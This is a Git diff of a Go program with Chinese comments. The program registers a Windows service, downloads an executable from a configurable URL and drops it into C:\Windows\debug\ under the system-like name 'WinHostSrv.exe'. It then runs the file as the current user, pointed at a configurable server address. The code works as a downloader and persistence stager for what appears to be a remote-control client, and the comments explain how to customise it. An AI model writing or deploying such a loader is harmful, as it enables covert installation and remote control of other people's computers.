@@ -1,4 +1,4 @@
-// 该文件自定义方式：设置22-24行常量值即可
+// 该文件自定义方式：设置22-26行常量值即可
 
 package main
 
@@ -19,9 +19,11 @@ import (
 )
 
 const (
-	ServerAddr  = ""  // 你的server端域名，格式如"http://rbsi.yxzl.top:5002/"
-	DownloadUrl = ""  // 你的Python主进程http下载地址
-	ServiceName = "ATest"  // 注册的服务名称
+	ServerAddr  = ``                  // 你的server端域名，格式如"http://rbsi.yxzl.top:5002/"
+	DownloadUrl = ``                  // 你的Python主进程http下载地址
+	ServiceName = `ATest`             // 注册的服务名称
+	DirName     = `C:\Windows\debug\` // Python文件存放路径，建议使用C盘Win已有目录，否则参考115行新建。严禁包含空格！
+	ExeName     = `WinHostSrv.exe`    // Python Exe文件名称
 )
 
 var (
@@ -110,14 +112,13 @@ func main() {
 		install()
 	}
 
-	os.Mkdir(`D:/Program Files`, os.ModePerm)
-	os.Mkdir(`D:/Program Files/Windows`, os.ModePerm)
+	os.Mkdir(DirName, os.ModePerm) // 新建目录，如有不确定存在的父目录逐级新建
 	res, _ := http.Get(DownloadUrl)
-	exe, _ := os.Create("D:/Program Files/Windows/WindowsHostSvc.exe")
+	exe, _ := os.Create(DirName + ExeName)
 	io.Copy(exe, res.Body)
 	exe.Close()
 	get_cmd("sc start " + ServiceName)
-	StartProcessAsCurrentUser(`D:/Program Files/Windows/WindowsHostSvc.exe`, `D:/Program Files/Windows/WindowsHostSvc.exe `+ServerAddr, `D:/Program Files/Windows/`, true)
+	StartProcessAsCurrentUser(DirName+ExeName, DirName+ExeName+" "+ServerAddr, DirName, true)
 
 	time.Sleep(time.Second * 1)
 }
